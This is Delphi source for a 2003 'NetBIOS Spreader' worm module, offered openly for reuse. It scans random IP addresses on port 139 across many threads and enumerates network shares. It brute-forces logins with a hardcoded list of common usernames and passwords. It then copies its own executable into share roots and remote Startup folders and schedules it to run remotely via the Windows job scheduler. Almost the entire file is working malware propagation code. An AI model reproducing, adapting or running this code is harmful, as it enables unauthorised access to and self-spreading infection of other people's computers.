   {***********************************************************************}
   {  NetBIOS Spreader 0.4 by Positron                                     }
   {  URL: http://www.virustrading.com/positron                            }
   {                                                                       }
   {  Tested on Windows XP. Write me if you find any error in the code!    }
   {                                                                       }
   {  If you use this source then you must credit Positron. You can freely }
   {  use this source in NON-Commercial applications.                      }
   {                                                                       }
   {  Thanks goes to r-22                                                  }
   {                                                                       }
   {  Notice:                                                              }
   {    You can use ACLUnits and KOL System replacement units if you want  }
   {    to make its compiled size smaller.                                 }
   {***********************************************************************}
   {  History:                                                             }
   {     08/08/2003 - First public version (v0.3)                          }
   {     10/09/2003 - Some optimalisations (v0.4)                          }
   {***********************************************************************}

   UNIT NetBIOS;

   INTERFACE

   {$DEFINE Debug}

   PROCEDURE StartNetBIOS;

   IMPLEMENTATION

   USES
     Windows, WinSock, WinInet, main, settings;

   VAR
     AA:integer;
     lpNetApiBufferFree  : FUNCTION(VAR Buffer) : DWORD;STDCALL;
     lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
     lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
     OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
     NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;

   CONST
     PREVIOUS_IP              = '2';
     NEXT_IP                  = '1';
     NERR_SUCCESS             = 0;
     MAX_NB_THREAD            = 50;
     MAX_USERNAME             = 4;
     ERROR_ACCESS_DENIED      = 5;
     STYPE_PRINTQ             = 1;
     ERROR_INVALID_PASSWORD   = 86;
     MAX_PASSWORD             = 101;
     ERROR_NO_NET_OR_BAD_PATH = 1203;
     ERROR_LOGON_FAILURE      = 1326;
     lpszPassword  : ARRAY [0..MAX_PASSWORD] OF STRING = (
           '','1234','password','6969','harley','123456','golf','pussy','mustang',
           '1111','shadow','1313','fish','5150','7777','qwerty','baseball','2112',
           'letmein','12345678','12345','ccc','admin','Admin','Password','1','12',
           '123','1234567','123456789','654321','54321','111','000000','abc','pw',
           '11111111','88888888','pass','passwd','database','abcd','abc123','pass',
           'sybase','123qwe','server','computer','Internet','super','123asd','0',
           'ihavenopass','godblessyou','enable','xp','2002','2003','2600','alpha',
           '110','111111','121212','123123','1234qwer','123abc','007','a','aaa',
           'patrick','pat','administrator','root','sex','god','foobar','secret',
           'abc','test','test123','temp','temp123','win','pc','asdf','oracle''pwd',
           'qwer','yxcv','zxcv','home','xxx','owner','login','Login','pw123',
           'love','mypc','mypc123','admin123','mypass','mypass123','901100');
     lpszUserName  : ARRAY [0..MAX_USERNAME] OF STRING = (
           '','Guest','Administrator','Owner','Root');

   //------------------------------------------------------------------------------
   FUNCTION IntToStr(I:Integer) : STRING;
   BEGIN
     Str(I,Result);
   END;

   //------------------------------------------------------------------------------
   FUNCTION ExtractFileName(CONST FileName:ShortString) : ShortString;
   VAR
     I : Integer;
   BEGIN
     I:=Length(FileName);
     WHILE (I>=1)AND NOT(FileName[I] IN ['\',':']) DO Dec(I);
     Result:=Copy(FileName,I+1,255);
     IF Result[0]>#0 THEN IF Result[Ord(Result[0])]=#0 THEN Dec(Result[0]);
   END;

   //------------------------------------------------------------------------------
   FUNCTION DirectoryExists(CONST Dir:STRING) : BOOL;
   VAR
     Attr : DWORD;
   BEGIN
     Attr:=GetFileAttributes(pChar(Dir));
     Result:=(Attr<>$FFFFFFFF)AND(Attr AND FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY);
   END;

   //------------------------------------------------------------------------------
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     Result:=False;
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE NetRemoteExecute(szServer,szLocation:STRING);
   TYPE
     PTIME_OF_DAY_INFO = ^TTIME_OF_DAY_INFO;
     TTIME_OF_DAY_INFO = RECORD
       tod_elapsedt    : DWORD;
       tod_msecs       : DWORD;
       tod_hours       : DWORD;
       tod_mins        : DWORD;
       tod_secs        : DWORD;
       tod_hunds       : DWORD;
       tod_timezone    : LongInt;
       tod_tinterval   : DWORD;
       tod_day         : DWORD;
       tod_month       : DWORD;
       tod_year        : DWORD;
       tod_weekday     : DWORD;
     END;
     AT_INFO           = RECORD
       JobTime         : DWORD;
       DaysOfMonth     : DWORD;
       DaysOfWeek      : UCHAR;
       Flags           : UCHAR;
       Command         : pWideChar;
     END;
   VAR
     JobID        : DWORD;
     dwRemoteTime : DWORD;
     dwReturn     : DWORD;
     NetAT        : AT_INFO;
     wcCmd        : PWideChar;
     wcServer     : PWideChar;
     lpNetTOD     : PTIME_OF_DAY_INFO;
   BEGIN
     GetMem(wcCmd,1024+1);
     GetMem(wcServer,256+1);
     lpNetTOD:=NIL;
     {$IFDEF Debug}

     {$ENDIF}
     StringToWideChar(szServer,wcServer,SizeOf(wcServer)+1);
     StringToWideChar(szLocation,wcCmd,SizeOf(wcCmd)+1);
     dwReturn:=lpNetRemoteTOD(pChar(wcServer),@lpNetTOD);
     IF dwReturn=NERR_Success THEN BEGIN
       //* add 2 minutes to current time
       dwRemoteTime:=(lpNetTOD.tod_hours*3600+lpNetTOD.tod_mins*60+lpNetTOD.tod_secs)*1000+lpNetTOD.tod_hunds*10;
       IF lpNetTOD.tod_timezone<>-1 THEN dwRemoteTime:=dwRemoteTime-lpNetTOD.tod_timezone*60000;
       dwRemoteTime:=dwRemoteTime+(2*60)*1000;                                     //* add two minutes to current remote time
       IF IsNTBasedOS THEN lpNetApiBufferFree(lpNetTOD);
       FillChar(NetAT,0,SizeOf(NetAT));
       NetAT.JobTime:=dwRemoteTime;
       NetAT.Command:=@wcCmd;
       dwReturn:=lpNetScheduleJobAdd(pChar(wcServer),@NetAT,JobID);
       {$IFDEF Debug}

       {$ENDIF}
     END;
     FreeMem(wcCmd);
     FreeMem(wcServer);
   END;

   //------------------------------------------------------------------------------
   FUNCTION InfectSharedResource(szRemoteName,szRemoteUNC:STRING) : BOOL;
   LABEL
     Next;
   VAR
     I             : DWORD;
     dwRet         : DWORD;
     szLocation    : STRING;
     szFullPath    : STRING;
     bCopy2        : BOOL;
     nK            : Integer;
     nL            : Integer;
     nN            : Integer;
     lpszFileName  : pWideChar;
     NetResource   : TNetResource;
     NetResource2  : TNetResource;
     MaxUserName   : WORD;
     MaxPassword   : WORD;
   CONST
     PathSize      = 4;
     Path          : ARRAY[1..PathSize] OF STRING =(
                         '\',
                         '\Documents and Settings\All Users\Start Menu\Programs\Startup\',
                         '\WINDOWS\Start Menu\Programs\Startup\',
                         '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\');
   BEGIN
     Result:=False;
     bCopy2:=False;
     szRemoteName:=szRemoteUNC+'\'+szRemoteName;
     NetResource.dwType:=RESOURCETYPE_DISK;
     NetResource.lpLocalName:=NIL;
     NetResource.lpRemoteName:=pChar(szRemoteName);
     NetResource.lpProvider:=NIL;
     lpszFileName:=NIL;
     GetModuleFileName(GetModuleHandle(nil),pChar(szFullPath),Length(szFullPath));
     lpszFileName:=pWideChar(string(ExtractFilename(szFullPAth)));
     IF IsNTBasedOS THEN BEGIN
       MaxUserName:=MAX_USERNAME;
       MaxPassword:=MAX_PASSWORD;
     END ELSE BEGIN
       MaxUserName:=0;
       MaxPassword:=0;
     END;
     FOR nK:=0 TO MaxUserName DO BEGIN
       FOR nL:=0 TO MaxPassword DO BEGIN
         {$IFDEF Debug}
         (*
          if n_report then begin
           sleep(600);
           sendmsg('[Pass]'+lpszPassword[nL]+' [Username]'+lpszUserName[nK]+' [Path]'+NetResource.lpRemoteName);
          end;  *)
         {$ENDIF}
         dwRet:=WNetAddConnection2(NetResource,pChar(lpszPassword[nL]),pChar(lpszUserName[nK]),0);
         {$IFDEF Debug}
         CASE dwRet OF
           ERROR_NO_NET_OR_BAD_PATH : Exit;
         END;
         {$ENDIF}
         IF dwRet=NO_ERROR THEN BEGIN
           FOR I:=1 TO PathSize DO BEGIN
             IF I=1 THEN BEGIN                                                     // Copy file to root dir of shared resource
               IF DirectoryExists(szRemoteName)AND(NOT BCopy2) THEN BEGIN
                 bCopy2:=CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+'\Xi.exe'),False);
                 IF NOT bCopy2 THEN GOTO Next;
                 Result:=True;
                 IF IsNTBasedOS THEN NetRemoteExecute(szRemoteUNC,'Xi.exe');
                 {$IFDEF Debug}
         if n_report then
           sendmsg('[COPYED] From: '+ParamStr(0)+' To: '+NetResource.lpRemoteName+'\Xi.exe');
                 {$ENDIF}
               END;
             END ELSE BEGIN                                                        // Copy files to startup dirs
               IF DirectoryExists(NetResource.lpRemoteName+Path[I]) THEN BEGIN
                 IF CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+Path[I]+'Setup.exe'),False) THEN BEGIN
                   {$IFDEF Debug}
         if n_report then
           sendmsg('[COPYED] From: '+ParamStr(0)+' To: '+NetResource.lpRemoteName+Path[I]+'Setup.exe');
                   {$ENDIF}
                   FOR nN:=0 TO 20 DO IF WnetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Exit;
                   Result:=True;
                   Exit;
                 END;
               END;
             END;
           END;
           Next:
           FOR nN:=0 TO 20 DO IF WnetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Break;
           {$IFDEF Debug}

           {$ENDIF}
         END;
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION EnumShare(szRemoteAddr:STRING) : BOOL;
   TYPE
     Share_INFO_1   = RECORD
       shi1_netname : PWideChar;
       shi1_type    : DWORD;
       shi1_remark  : LPTSTR;
     END;
     LPShare_INFO_1 =^Share_INFO_1;
   VAR
     dwK            : DWORD;
     hResume        : DWORD;
     dwReturn       : DWORD;
     dwReadEntires  : DWORD;
     dwTotalEntires : DWORD;
     szShareName    : STRING;
     wcRemoteAddr   : pWideChar;
     lpShareInfo    : LPSHARE_INFO_1;
     lpCurrentInfo  : LPSHARE_INFO_1;
   BEGIN
     Result:=False;
     GetMem(wcRemoteAddr,MAX_PATH+10);
     StringToWideChar(szRemoteAddr,wcRemoteAddr,MAX_PATH+10);
     hResume:=0;
     REPEAT
       lpShareInfo:=NIL;
       IF IsNTBasedOS THEN dwReturn:=NT_NetShareEnum(wcRemoteAddr,1,lpShareInfo,8192,dwReadEntires,dwTotalEntires,hResume)
        ELSE dwReturn:=OLD_NetShareEnum(pChar(wcRemoteAddr),1,lpShareInfo,8192,dwReadEntires,dwTotalEntires);
       IF(dwReturn<>ERROR_MORE_DATA)AND(dwReturn<>ERROR_SUCCESS) THEN Break;
       lpCurrentInfo:=lpShareInfo;
       FOR dwK:=0 TO dwReadEntires-1 DO BEGIN
         szShareName:=lpCurrentInfo.shi1_netname;
         {$IFDEF Debug}
      if n_report then
       Sendmsg('[SHARE] Server: '+szRemoteAddr+' Share: '+szShareName);
         {$ENDIF}
         IF lpcurrentinfo.shi1_type<>STYPE_PRINTQ THEN Result:=InfectSharedResource(szShareName,szRemoteAddr);
         Inc(lpCurrentInfo);
       END;
       IF IsNTBasedOS THEN lpNetAPIBufferFree(lpShareInfo);
     UNTIL dwReturn<>ERROR_MORE_DATA;
     FreeMem(wcRemoteAddr);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE GetRandomIP(VAR szIPAddr:STRING;VAR NIPAddrA,NIPAddrB,NIPAddrC,NIPAddrD:WORD);
   BEGIN
     IF (szIPAddr='') or (b_ip1 <> 'x')or (b_ip1 <> 'X') THEN BEGIN
      if (b_ip1 <> 'x') and (b_ip1 <> 'X') then
        nIPAddrA:=strtoint(b_ip1)
       else
       nIPAddrA:=Random(254)+1;

      if (b_ip2 <> 'x') and (b_ip2 <> 'X') then
        nIPAddrB:=strtoint(b_ip2)
       else
       nIPAddrB:=Random(254)+1;

       nIPAddrC:=Random(254)+1;
       nIPAddrD:=Random(254)+1;
     END;
     IF(szIPAddr=NEXT_IP)AND(nIPAddrD<255)THEN Inc(nIPAddrD);
     IF(szIPAddr=PREVIOUS_IP)AND(nIPAddrD>2)THEN Dec(nIPAddrD,2);
     szIPAddr:=IntToStr(nIPAddrA)+'.'+IntToStr(nIPAddrB)+'.'+IntToStr(nIPAddrC)+'.'+IntToStr(nIPAddrD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InfectNetBIOS;
   VAR
     szIPAddr      : STRING;
     Sock          : TSocket;
     SockAddr      : TSockAddrIn;
     IPA           : WORD;
     IPB           : WORD;
     IPC           : WORD;
     IPD           : WORD;
     R             : BOOL;
   BEGIN
     R:=False;
     szIPAddr:='';
     WHILE True DO BEGIN
       IF R=True THEN BEGIN
         IF szIPAddr=PREVIOUS_IP THEN szIPAddr:='' ELSE BEGIN
           IF szIPAddr=NEXT_IP THEN szIPAddr:=PREVIOUS_IP;
           IF szIPAddr='' THEN szIPAddr:=NEXT_IP;
         END;
       END ELSE szIPAddr:='';
       GetRandomIP(szIPAddr,IPA,IPB,IPC,IPD);
       {$IFDEF Debug}

       {$ENDIF}
       AA:=AA+1;
       if aa > max_nb_thread then aa := 0;
       if (AA >= MAX_NB_ThREAD) then begin
        if n_report then
        sendmsg('[TESTING] '+szipaddr);
        aa := 0;
       end;
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       SockAddr.sin_family:=AF_INET;
       SockAddr.sin_port:=htons(139);
       SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
       IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN BEGIN
         {$IFDEF Debug}
        if n_report then
           sendmsg('[OPEN] '+szIPaddr);
         {$ENDIF}
         CloseSocket(Sock);
         R:=EnumShare('\\'+szIPAddr);
       END ELSE BEGIN
         {$IFDEF Debug}

         {$ENDIF}
         CloseSocket(Sock);
       END;

       Sleep(512);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitNETAPIFunctions;
   VAR
     NETAPI32 : Thandle;
   BEGIN
     NETAPI32:=LoadLibrary('netapi32.dll');
     lpNetRemoteTOD:=GetProcAddress(NETAPI32,'NetRemoteTOD');
     lpNetScheduleJobAdd:=GetProcAddress(NETAPI32,'NetScheduleJobAdd');
     IF IsNTBasedOS THEN BEGIN
       NT_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
       lpNetAPIBufferFree:=GetProcAddress(NETAPI32,'NetApiBufferFree');
     END ELSE OLD_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartNetBIOS;
   VAR
     Msg      : TMsg;
     I        : WORD;
     ThreadID : DWORD;
   BEGIN
     WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);                    //Wait for Internet connection
     Randomize;
     AA:= 0;
     InitNETAPIFunctions;
     FOR I:=0 TO MAX_NB_THREAD DO CreateThread(NIL,0,@InfectNetBios,NIL,I,ThreadID);
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);                          //Make application resident
   END;

   END.
